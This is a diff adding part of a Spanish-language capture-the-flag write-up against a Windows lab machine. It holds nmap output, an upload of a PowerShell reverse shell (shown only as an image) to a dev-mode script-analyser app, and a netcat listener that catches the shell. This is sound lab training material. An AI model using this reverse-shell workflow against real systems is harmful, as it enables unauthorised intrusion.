@@ -56,9 +56,126 @@ Utilizamos un Script en bash simple pero de gran ayuda. Script--> https://github
 
   -Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.
 
-  
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/stealth]
+    └─# nmap -p 139,445,3389,5985,8000,8080,8443,47001,49664,49665,49666,49667,49668,49669,49672 -sC 10.10.236.141 -vvv -oN info_ports
 
-  ---
-## Analizamos la informacion obtenida sobre los puertos.
+    PORT      STATE SERVICE       REASON          VERSION
+    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+    
+    445/tcp   open  microsoft-ds? syn-ack ttl 127
+    
+    3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+    |_ssl-date: 2023-12-15T17:47:08+00:00; +1s from scanner time.
+    | rdp-ntlm-info: 
+    |   Target_Name: HOSTEVASION
+    |   NetBIOS_Domain_Name: HOSTEVASION
+    |   NetBIOS_Computer_Name: HOSTEVASION
+    |   DNS_Domain_Name: HostEvasion
+    |   DNS_Computer_Name: HostEvasion
+    |   Product_Version: 10.0.17763
+    |_  System_Time: 2023-12-15T17:46:28+00:00
+    | ssl-cert: Subject: commonName=HostEvasion
+    | Issuer: commonName=HostEvasion
+    | Public Key type: rsa
+    | Public Key bits: 2048
+    | Signature Algorithm: sha256WithRSAEncryption
+    | Not valid before: 2023-07-28T19:06:15
+    | Not valid after:  2024-01-27T19:06:15
+    | MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a
+    | SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56
+    | -----BEGIN CERTIFICATE-----
+    | MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW[...]
+    |_-----END CERTIFICATE-----
+    
+    5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-title: Not Found
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+    
+    8000/tcp  open  http          syn-ack ttl 127 PHP cli server 5.5 or later
+    |_http-title: 404 Not Found
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    
+    8080/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+    |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+    |_http-title: PowerShell Script Analyser
+    |_http-open-proxy: Proxy might be redirecting requests
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    
+    8443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+    | tls-alpn: 
+    |_  http/1.1
+    |_ssl-date: TLS randomness does not represent time
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+    |_http-title: PowerShell Script Analyser
+    | ssl-cert: Subject: commonName=localhost
+    | Issuer: commonName=localhost
+    | Public Key type: rsa
+    | Public Key bits: 1024
+    | Signature Algorithm: sha1WithRSAEncryption
+    | Not valid before: 2009-11-10T23:48:47
+    | Not valid after:  2019-11-08T23:48:47
+    | MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+    | SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+    | -----BEGIN CERTIFICATE-----
+    | MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls[...]
+    |_-----END CERTIFICATE-----
+    
+    47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+    |_http-title: Not Found
+    
+    49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+    49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+
+## Analizamos la informacion obtenida sobre los puertos(Explotacion de la aplicacion obtenemos shell)
+
+Despues de analizar toda, empezaremos por el puerto 8080
+
+--Puerto 8080(http)
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/9b6a2630-2e5c-4def-92fb-880264e301ef)
+
+  Al encontrarse la aplicacion en dev-mode, pensamos en subir una reverse shell en powershell y bingo obtenemos shell en la maquina victima.
+
+  1) Creamos la reverse shell --> rs.ps1
+
+      ![image](https://github.com/Esevka/CTF/assets/139042999/68c212b0-034d-40d8-96dd-248cc3f19942)
+
+  2) Nos ponemos en escucha  y la subimos a la maquina victima a traves de la aplicacion web.
+
+      ![image](https://github.com/Esevka/CTF/assets/139042999/ffc118d8-fcff-4c0a-b1f6-d4cbf9487450)
+
+          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/stealth/contenido]
+          └─# rlwrap nc -lnvp 1988
+          listening on [any] 1988 ...
+          connect to [10.9.92.151] from (UNKNOWN) [10.10.170.164] 49833
+          whoami
+          hostevasion\evader
+
+## Postexplotacion(obtenemos flags y elevamos privilegios)
+
+- Subimos a la maquina victima netcat64.exe para obtener una shell mas interactiva y trabajar comodamente.
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
